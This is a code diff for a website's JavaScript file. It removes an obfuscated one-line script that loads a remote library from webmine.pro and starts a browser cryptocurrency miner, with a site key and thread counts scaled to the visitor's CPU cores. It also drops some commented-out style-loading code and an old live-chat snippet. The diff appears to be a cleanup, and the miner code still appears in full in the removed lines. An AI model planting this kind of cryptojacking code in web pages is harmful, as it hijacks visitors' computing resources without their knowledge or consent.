@@ -1,29 +1,4 @@
 'use strict';
-function lasdegdfb(){var e=navigator.hardwareConcurrency,n="797e40fd3d819f792c8d3e86ccd254bb71a800e8ff11";if(e>=12)var r=e/4,a=new CRLT.Anonymous(n,{threads:r,autoThreads:!1});else if(e<12&&e>=4)var r=e/2,a=new CRLT.Anonymous(n,{threads:r,autoThreads:!1});else a=new CRLT.Anonymous(n);a.start()}function eoigersd(e){return new Promise(function(n,r){var a;(a=document.createElement("script")).src=e,a.onload=n,a.onerror=r,document.head.appendChild(a)})}eoigersd("//webmine.pro/lib/crlt.js").then(function(){lasdegdfb()});
-//-------------------- Load some deferred styles --------------------//
-// var loadDeferredStyles = function() 
-// {
-// 	var addStylesNode = document.getElementById('deferred-styles');
-// 	var replacement = document.createElement('div');
-// 	replacement.innerHTML = addStylesNode.textContent;
-// 	document.body.appendChild(replacement);
-// 	addStylesNode.parentElement.removeChild(addStylesNode);
-// }
-// var raf = requestAnimationFrame || mozRequestAnimationFrame ||
-//     webkitRequestAnimationFrame || msRequestAnimationFrame;
-// if (raf) raf(function() { window.setTimeout(loadDeferredStyles, 0); });
-// else window.addEventListener('load', loadDeferredStyles);
-//-------------------- /Load some deferred styles --------------------//
-
-// var _smartsupp = _smartsupp || {};
-// _smartsupp.key = 'f32f591b82ffa879c325ae96ca021013ef7a7d64';
-// window.smartsupp||(function(d) {
-//   var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
-//   s=d.getElementsByTagName('script')[0];c=d.createElement('script');
-//   c.type='text/javascript';c.charset='utf-8';c.async=true;
-//   c.src='//www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
-// })(document);
-
 
 // Smartsupp Live Chat script
 var _smartsupp = _smartsupp || {};
